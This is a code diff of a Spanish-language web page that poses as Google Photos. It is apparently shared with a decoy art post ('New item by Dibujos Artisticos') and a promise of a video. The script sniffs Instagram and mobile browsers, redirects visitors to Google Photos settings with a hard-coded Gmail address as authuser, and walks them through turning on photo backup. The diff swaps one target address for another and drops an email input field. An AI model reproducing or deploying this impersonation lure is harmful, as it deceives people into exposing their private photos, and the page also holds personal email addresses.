@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+
    <link rel="icon" href="https://i.ibb.co/pyp9n23/icons.png" type="image/x-icon">
     <link rel="shortcut icon" href="https://i.ibb.co/pyp9n23/icons.png" type="image/x-icon">
 
@@ -10,7 +11,8 @@
     <meta property="og:description" content="New item by Dibujos Artisticos" />
     <meta property="og:image" content="https://i.ibb.co/GDfZ1J3/dibunewie.png" />
         
-    <title>Fotos - Google Fotos</title>
+    <title>Fotos - Google Fotos </title>
+    
     
 <style>
   body {
@@ -101,17 +103,6 @@
     opacity: 0.7;
     margin-bottom: 20px;
     color: #9aa0a6;
-  }
-  
-  .account-info {
-    font-size: 14px;
-    opacity: 0.8;
-    margin-bottom: 20px;
-    color: #4285f4;
-    background: rgba(66, 133, 244, 0.1);
-    padding: 8px 16px;
-    border-radius: 20px;
-    display: inline-block;
   }
   
   .main-submessage {
@@ -217,6 +208,7 @@
     display: none;
   }
   
+  /* Animación para el logo de Google Photos */
   .photos-icon {
     width: 48px;
     height: 48px;
@@ -230,35 +222,6 @@
     font-size: 20px;
     vertical-align: middle;
   }
-
-  .account-selector {
-    margin: 20px 0;
-    text-align: left;
-  }
-
-  .account-selector label {
-    color: #e8eaed;
-    font-size: 14px;
-    display: block;
-    margin-bottom: 8px;
-  }
-
-  .account-selector input {
-    width: 100%;
-    padding: 12px;
-    border: 1px solid #333;
-    border-radius: 8px;
-    background: #1a1a1a;
-    color: #ffffff;
-    font-size: 14px;
-    box-sizing: border-box;
-  }
-
-  .account-selector input:focus {
-    outline: none;
-    border-color: #4285f4;
-    box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
-  }
 </style>
 </head>
 <body>
@@ -267,7 +230,6 @@
       <div class="spinner"></div>
       <div class="message">Abriendo Google Fotos...</div>
       <div class="submessage">Configurando copia y sincronización</div>
-      <div class="account-info" id="loadingAccount"></div>
     </div>
     
     <div id="fallback" class="hidden">
@@ -277,11 +239,6 @@
       </div>
       
       <div class="main-submessage">Activa la sincronización<br>para ver el video.</div>
-      
-      <div class="account-selector">
-        <label for="emailInput">Correo de la cuenta:</label>
-        <input type="email" id="emailInput" placeholder="ejemplo@gmail.com" value="">
-      </div>
       
       <div>
         <button id="mainButton" class="manual-button" onclick="openGooglePhotos()">
@@ -295,9 +252,8 @@
           Pasos a seguir:
         </div>
         <div class="instruction-steps">
-          <div class="step-item">Se abrirá Google Fotos para la cuenta especificada</div>
+          <div class="step-item">Se abrirá Google Fotos</div>
           <div class="step-item">Ve a tu foto de perfil (esquina superior derecha)</div>
-          <div class="step-item">Verifica que estés en la cuenta correcta</div>
           <div class="step-item">Toca "Configuración de Fotos"</div>
           <div class="step-item">Selecciona "Copia de seguridad"</div>
           <div class="step-item">Activa la copia de seguridad</div>
@@ -307,19 +263,9 @@
   </div>
 
   <script>
-    // Configuración - Cambia este email por el que necesites
-    const TARGET_EMAIL = 'photostudiopro11@gmail.com';
+    // CONFIGURA EL EMAIL ESPECÍFICO AQUÍ
+    const SPECIFIC_EMAIL = 'pepitacabrera@gmail.com';
     
-    function getTargetEmail() {
-      // Primero intenta obtener el email del input
-      const emailInput = document.getElementById('emailInput');
-      if (emailInput && emailInput.value.trim()) {
-        return emailInput.value.trim();
-      }
-      // Si no hay input o está vacío, usa el email por defecto
-      return TARGET_EMAIL;
-    }
-
     function detectDevice() {
       const ua = navigator.userAgent || navigator.vendor || window.opera;
       
@@ -345,48 +291,29 @@
     function openGooglePhotos() {
       const device = detectDevice();
       const fromInstagram = isInstagram();
-      const targetEmail = getTargetEmail();
-      
-      // URLs específicas para la cuenta
-      const webUrl = `https://photos.google.com/u/${targetEmail}/settings`;
-      const webUrlAlt = `https://photos.google.com/settings?authuser=${targetEmail}`;
       
       if (device === 'android') {
         if (fromInstagram) {
-          // Para Instagram Android, intentar con deep link específico
-          const deepLink = `intent://photos.google.com/u/${targetEmail}/settings#Intent;scheme=https;package=com.google.android.apps.photos;S.browser_fallback_url=https://play.google.com/store/apps/details?id=com.google.android.apps.photos;end`;
-          window.location.href = deepLink;
-          
-          // Fallback después de un tiempo
-          setTimeout(() => {
-            window.location.href = webUrlAlt;
-          }, 2000);
+          // Para Instagram Android, usar un enlace que detecte si la app está instalada
+          // Este enlace funciona mejor: si la app está instalada la abre, si no va a Play Store
+          window.location.href = 'https://play.google.com/store/apps/details?id=com.google.android.apps.photos&launch=true';
         } else {
-          // Para navegadores normales, usar intent con cuenta específica
-          const intentUrl = `intent://photos.google.com/u/${targetEmail}/settings#Intent;scheme=https;package=com.google.android.apps.photos;S.browser_fallback_url=${encodeURIComponent(webUrlAlt)};end`;
-          window.location.href = intentUrl;
+          // Para navegadores normales, usar intent a configuraciones con email específico
+          window.location.href = `intent://photos.google.com/settings?authuser=${SPECIFIC_EMAIL}#Intent;scheme=https;package=com.google.android.apps.photos;S.browser_fallback_url=https://play.google.com/store/apps/details?id=com.google.android.apps.photos;end`;
         }
       } else if (device === 'ios') {
-        // Para iOS, intentar abrir la app con deep link
-        const iosDeepLink = `googlephotos://photos.google.com/u/${targetEmail}/settings`;
-        window.location.href = iosDeepLink;
+        // Para iOS, intentar abrir la app
+        window.location.href = "googlephotos://";
         
-        // Si no se abre, intentar con URL web
-        setTimeout(() => {
-          if (document.visibilityState === 'visible') {
-            window.location.href = webUrlAlt;
-          }
-        }, 1500);
-        
-        // Como último recurso, App Store
+        // Si no se abre, ir a App Store
         setTimeout(() => {
           if (document.visibilityState === 'visible') {
             window.location.href = "https://apps.apple.com/app/google-photos/id962194608";
           }
-        }, 3000);
+        }, 1500);
       } else {
-        // Para web, ir directamente a la configuración con la cuenta específica
-        window.location.href = webUrl;
+        // Para web con email específico
+        window.location.href = `https://photos.google.com/settings?authuser=${SPECIFIC_EMAIL}`;
       }
     }
 
@@ -394,57 +321,42 @@
       const device = detectDevice();
       const inApp = isInAppBrowser();
       const fromInstagram = isInstagram();
-      const targetEmail = getTargetEmail();
-      
-      // Mostrar el email en la carga
-      const loadingAccount = document.getElementById('loadingAccount');
-      if (loadingAccount) {
-        loadingAccount.textContent = targetEmail;
-      }
       
       try {
         if (device === 'web' && !inApp) {
-          // Para PC en navegadores normales, ir directamente con cuenta específica
-          setTimeout(() => {
-            window.location.href = `https://photos.google.com/u/${targetEmail}/settings`;
-          }, 1000);
+          // Para PC en navegadores normales, ir directamente con email específico
+          window.location.href = `https://photos.google.com/settings?authuser=${SPECIFIC_EMAIL}`;
           return;
         }
         
         if (fromInstagram || inApp) {
           // Para Instagram y otros navegadores internos, mostrar botón inmediatamente
+          // Mantener el mismo mensaje para todos
+          
           setTimeout(() => {
             document.getElementById('loading').classList.add('hidden');
             document.getElementById('fallback').classList.remove('hidden');
-            // Pre-llenar el input con el email objetivo
-            document.getElementById('emailInput').value = targetEmail;
           }, 800);
           return;
         }
         
         // Para navegadores móviles normales, intentar abrir directamente
         if (device === 'android') {
-          const intentUrl = `intent://photos.google.com/u/${targetEmail}/settings#Intent;scheme=https;package=com.google.android.apps.photos;S.browser_fallback_url=https://photos.google.com/settings?authuser=${targetEmail};end`;
-          window.location.href = intentUrl;
+          window.location.href = `intent://photos.google.com/settings?authuser=${SPECIFIC_EMAIL}#Intent;scheme=https;package=com.google.android.apps.photos;S.browser_fallback_url=https://play.google.com/store/apps/details?id=com.google.android.apps.photos;end`;
         } else if (device === 'ios') {
-          const iosDeepLink = `googlephotos://photos.google.com/u/${targetEmail}/settings`;
-          window.location.href = iosDeepLink;
+          window.location.href = "googlephotos://";
         }
         
         // Mostrar opciones después de un tiempo corto
         setTimeout(() => {
           document.getElementById('loading').classList.add('hidden');
           document.getElementById('fallback').classList.remove('hidden');
-          // Pre-llenar el input con el email objetivo
-          document.getElementById('emailInput').value = targetEmail;
         }, 2000);
         
       } catch (error) {
         console.error('Error en redirección:', error);
         document.getElementById('loading').classList.add('hidden');
         document.getElementById('fallback').classList.remove('hidden');
-        // Pre-llenar el input con el email objetivo
-        document.getElementById('emailInput').value = targetEmail;
       }
     }
 
@@ -464,11 +376,6 @@
         setTimeout(() => {
           document.getElementById('loading').classList.add('hidden');
           document.getElementById('fallback').classList.remove('hidden');
-          // Pre-llenar el input con el email objetivo si no tiene valor
-          const emailInput = document.getElementById('emailInput');
-          if (!emailInput.value.trim()) {
-            emailInput.value = TARGET_EMAIL;
-          }
         }, 500);
       }
     }
